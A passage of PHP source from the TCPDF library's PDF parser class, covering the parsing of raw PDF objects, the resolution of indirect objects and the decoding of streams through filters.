					$open_bracket = 1;
					while ($open_bracket > 0) {
						if (!isset($this->pdfdata{$strpos})) {
							break;
						}
						$ch = $this->pdfdata{$strpos};
						switch ($ch) {
							case '\\': { // REVERSE SOLIDUS (5Ch) (Backslash)
								// skip next character
								++$strpos;
								break;
							}
							case '(': { // LEFT PARENHESIS (28h)
								++$open_bracket;
								break;
							}
							case ')': { // RIGHT PARENTHESIS (29h)
								--$open_bracket;
								break;
							}
						}
						++$strpos;
					}
					$objval = substr($this->pdfdata, $offset, ($strpos - $offset - 1));
					$offset = $strpos;
				}
				break;
			}
			case '[':   // \x5B LEFT SQUARE BRACKET
			case ']': { // \x5D RIGHT SQUARE BRACKET
				// array object
				$objtype = $char;
				++$offset;
				if ($char == '[') {
					// get array content
					$objval = array();
					do {
						// get element
						$element = $this->getRawObject($offset);
						$offset = $element[2];
						$objval[] = $element;
					} while ($element[0] != ']');
					// remove closing delimiter
					array_pop($objval);
				}
				break;
			}
			case '<':   // \x3C LESS-THAN SIGN
			case '>': { // \x3E GREATER-THAN SIGN
				if (isset($this->pdfdata{($offset + 1)}) AND ($this->pdfdata{($offset + 1)} == $char)) {
					// dictionary object
					$objtype = $char.$char;
					$offset += 2;
					if ($char == '<') {
						// get array content
						$objval = array();
						do {
							// get element
							$element = $this->getRawObject($offset);
							$offset = $element[2];
							$objval[] = $element;
						} while ($element[0] != '>>');
						// remove closing delimiter
						array_pop($objval);
					}
				} else {
					// hexadecimal string object
					$objtype = $char;
					++$offset;
					if (($char == '<') AND (preg_match('/^([0-9A-Fa-f\x09\x0a\x0c\x0d\x20]+)>/iU', substr($this->pdfdata, $offset), $matches) == 1)) {
						// remove white space characters
						$objval = strtr($matches[1], "\x09\x0a\x0c\x0d\x20", '');
						$offset += strlen($matches[0]);
					} elseif (($endpos = strpos($this->pdfdata, '>', $offset)) !== FALSE) {
						$offset = $endpos + 1;
                    }
				}
				break;
			}
			default: {
				if (substr($this->pdfdata, $offset, 6) == 'endobj') {
					// indirect object
					$objtype = 'endobj';
					$offset += 6;
				} elseif (substr($this->pdfdata, $offset, 4) == 'null') {
					// null object
					$objtype = 'null';
					$offset += 4;
					$objval = 'null';
				} elseif (substr($this->pdfdata, $offset, 4) == 'true') {
					// boolean true object
					$objtype = 'boolean';
					$offset += 4;
					$objval = 'true';
				} elseif (substr($this->pdfdata, $offset, 5) == 'false') {
					// boolean false object
					$objtype = 'boolean';
					$offset += 5;
					$objval = 'false';
				} elseif (substr($this->pdfdata, $offset, 6) == 'stream') {
					// start stream object
					$objtype = 'stream';
					$offset += 6;
					if (preg_match('/^([\r]?[\n])/isU', substr($this->pdfdata, $offset), $matches) == 1) {
						$offset += strlen($matches[0]);
						if (preg_match('/(endstream)[\x09\x0a\x0c\x0d\x20]/isU', substr($this->pdfdata, $offset), $matches, PREG_OFFSET_CAPTURE) == 1) {
							$objval = substr($this->pdfdata, $offset, $matches[0][1]);
							$offset += $matches[1][1];
						}
					}
				} elseif (substr($this->pdfdata, $offset, 9) == 'endstream') {
					// end stream object
					$objtype = 'endstream';
					$offset += 9;
				} elseif (preg_match('/^([0-9]+)[\s]+([0-9]+)[\s]+R/iU', substr($this->pdfdata, $offset, 33), $matches) == 1) {
					// indirect object reference
					$objtype = 'objref';
					$offset += strlen($matches[0]);
					$objval = intval($matches[1]).'_'.intval($matches[2]);
				} elseif (preg_match('/^([0-9]+)[\s]+([0-9]+)[\s]+obj/iU', substr($this->pdfdata, $offset, 33), $matches) == 1) {
					// object start
					$objtype = 'obj';
					$objval = intval($matches[1]).'_'.intval($matches[2]);
					$offset += strlen ($matches[0]);
				} elseif (($numlen = strspn($this->pdfdata, '+-.0123456789', $offset)) > 0) {
					// numeric object
					$objtype = 'numeric';
					$objval = substr($this->pdfdata, $offset, $numlen);
					$offset += $numlen;
				}
				break;
			}
		}
		return array($objtype, $objval, $offset);
	}

	/**
	 * Get content of indirect object.
	 * @param $obj_ref (string) Object number and generation number separated by underscore character.
	 * @param $offset (int) Object offset.
	 * @param $decoding (boolean) If true decode streams.
	 * @return array containing object data.
	 * @protected
	 * @since 1.0.000 (2011-05-24)
	 */
	protected function getIndirectObject($obj_ref, $offset=0, $decoding=true) {
		$obj = explode('_', $obj_ref);
		if (($obj === false) OR (count($obj) != 2)) {
			$this->Error('Invalid object reference: '.$obj);
			return;
		}
		$objref = $obj[0].' '.$obj[1].' obj';
		// ignore leading zeros
		$offset += strspn($this->pdfdata, '0', $offset);
		if (strpos($this->pdfdata, $objref, $offset) != $offset) {
			// an indirect reference to an undefined object shall be considered a reference to the null object
			return array('null', 'null', $offset);
		}
		// starting position of object content
		$offset += strlen($objref);
		// get array of object content
		$objdata = array();
		$i = 0; // object main index
		do {
			// get element
			$element = $this->getRawObject($offset);
			$offset = $element[2];
			// decode stream using stream's dictionary information
			if ($decoding AND ($element[0] == 'stream') AND (isset($objdata[($i - 1)][0])) AND ($objdata[($i - 1)][0] == '<<')) {
				$element[3] = $this->decodeStream($objdata[($i - 1)][1], $element[1]);
			}
			$objdata[$i] = $element;
			++$i;
		} while ($element[0] != 'endobj');
		// remove closing delimiter
		array_pop($objdata);
		// return raw object content
		return $objdata;
	}

	/**
	 * Get the content of object, resolving indect object reference if necessary.
	 * @param $obj (string) Object value.
	 * @return array containing object data.
	 * @protected
	 * @since 1.0.000 (2011-06-26)
	 */
	protected function getObjectVal($obj) {
		if ($obj[0] == 'objref') {
			// reference to indirect object
			if (isset($this->objects[$obj[1]])) {
				// this object has been already parsed
				return $this->objects[$obj[1]];
			} elseif (isset($this->xref[$obj[1]])) {
				// parse new object
				$this->objects[$obj[1]] = $this->getIndirectObject($obj[1], $this->xref[$obj[1]], false);
				return $this->objects[$obj[1]];
			}
		}
		return $obj;
	}

	/**
	 * Decode the specified stream.
	 * @param $sdic (array) Stream's dictionary array.
	 * @param $stream (string) Stream to decode.
	 * @return array containing decoded stream data and remaining filters.
	 * @protected
	 * @since 1.0.000 (2011-06-22)
	 */
	protected function decodeStream($sdic, $stream) {
		// get stream lenght and filters
		$slength = strlen($stream);
		if ($slength <= 0) {
			return array('', array());
		}
		$filters = array();
		foreach ($sdic as $k => $v) {
			if ($v[0] == '/') {
				if (($v[1] == 'Length') AND (isset($sdic[($k + 1)])) AND ($sdic[($k + 1)][0] == 'numeric')) {
					// get declared stream lenght
					$declength = intval($sdic[($k + 1)][1]);
					if ($declength < $slength) {
						$stream = substr($stream, 0, $declength);
						$slength = $declength;
					}
				} elseif (($v[1] == 'Filter') AND (isset($sdic[($k + 1)]))) {
					// resolve indirect object
					$objval = $this->getObjectVal($sdic[($k + 1)]);
					if ($objval[0] == '/') {
						// single filter
						$filters[] = $objval[1];
					} elseif ($objval[0] == '[') {
						// array of filters
						foreach ($objval[1] as $flt) {
							if ($flt[0] == '/') {
								$filters[] = $flt[1];
							}
						}
					}
				}
			}
		}
		// decode the stream
		$remaining_filters = array();
		foreach ($filters as $filter) {
			if (in_array($filter, TCPDF_FILTERS::getAvailableFilters())) {
				try {
					$stream = TCPDF_FILTERS::decodeFilter($filter, $stream);
				} catch (Exception $e) {
					$emsg = $e->getMessage();
					if ((($emsg[0] == '~') AND !$this->cfg['ignore_missing_filter_decoders'])
						OR (($emsg[0] != '~') AND !$this->cfg['ignore_filter_decoding_errors'])) {
						$this->Error($e->getMessage());
					}
				}
			} else {
				// add missing filter to array
				$remaining_filters[] = $filter;
			}
		}
		return array($stream, $remaining_filters);
	}

	/**
	 * Throw an exception or print an error message and die if the K_TCPDF_PARSER_THROW_EXCEPTION_ERROR constant is set to true.
	 * @param $msg (string) The error message
	 * @public
	 * @since 1.0.000 (2011-05-23)
	 */
	public function Error($msg) {
		if ($this->cfg['die_for_errors']) {
			die('<strong>TCPDF_PARSER ERROR: </strong>'.$msg);
		} else {
			throw new Exception('TCPDF_PARSER ERROR: '.$msg);
		}
	}

} // END OF TCPDF_PARSER CLASS

//============================================================+
// END OF FILE
//============================================================+
